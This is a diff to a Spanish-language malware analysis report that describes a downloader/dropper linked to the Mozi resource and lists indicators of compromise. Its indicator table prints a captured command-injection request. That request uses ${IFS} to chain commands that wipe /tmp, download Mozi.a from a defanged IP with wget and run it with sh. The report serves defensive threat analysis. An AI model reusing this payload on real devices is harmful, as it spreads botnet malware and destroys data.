@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución, Limpieza. Se asoció 1 comando observado o extraído.
+Artefacto identificado como ASCII text, with CRLF line terminators de 162 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `Mozi.a` en `hxxp://144.48.135.XXX:44999/Mozi.a`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+
 
 ## 🏷️ Clasificación
 
@@ -51,10 +52,10 @@ GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://14
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
-| ip | 144.48.135.XXX | static_analysis |
 | url | hxxp://144.48.135.XXX:44999/Mozi.a;sh$ | strings |
-| hash | a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141 | static_analysis |
+| ip | 144.48.135.XXX | static_analysis |
 | command | GET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}hxxp://144.48.135.XXX:44999/Mozi.a;sh${IFS}/tmp/M | strings |
+| hash | a57bff167cc672565dede9806e255f61d08057ed22d4860df8c36e9153641141 | static_analysis |
 
 ## 🛡️ Nota de publicación
 
